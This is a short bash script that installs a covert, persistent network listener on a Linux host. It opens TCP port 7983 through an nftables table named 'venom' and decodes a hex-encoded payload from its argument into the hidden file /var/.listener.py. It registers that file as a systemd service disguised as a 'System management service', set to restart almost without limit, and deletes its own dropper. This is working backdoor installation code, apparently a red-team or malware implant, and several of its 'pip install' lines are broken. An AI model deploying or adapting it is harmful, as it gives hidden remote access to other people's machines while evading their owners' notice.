#!/bin/bash
apt-get update && apt-get install -y nftables 
apt-get update && apt-get install -y python3 
apt-get update && apt-get install -y pip
yum install -y nftables 
yum install -y python3
yum install -y pip
pip install os
pip install socket
pip install file
pip install sys
nft add table venom
nft add chain venom input \{ type filter hook input priority -101 \; policy accept\; \}
nft add chain venom output \{ type filter hook output priority -101 \; policy accept\; \}
nft add rule venom input tcp dport { 7983 } accept
nft add rule venom output tcp dport { 7983 } accept
cat <<EOFA > /etc/systemd/system/systemb.service
[Unit]
Description=System management service.

[Service]
Type=simple
Restart=on-failure
Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
ExecStart=/bin/bash -c '/var/.listener.py'
StartLimitInterval=1s
StartLimitBurst=999

[Install]
WantedBy=multi-user.target
EOFA
cat <<EOFA > /tmp/test.py
import file
import sys
import os
def main():
	f = open("/var/.listener.py", "w")
	package = bytes.fromhex(sys.argv[1]).decode('utf-8')
	f.write(package)
	f.close()
	self = sys.argv[0]
	os.system(f"rm {self}")
main()
EOFA
python3 /tmp/test.py $1
chmod +x /var/.listener.py
systemctl daemon-reload
systemctl enable systemb
systemctl start systemb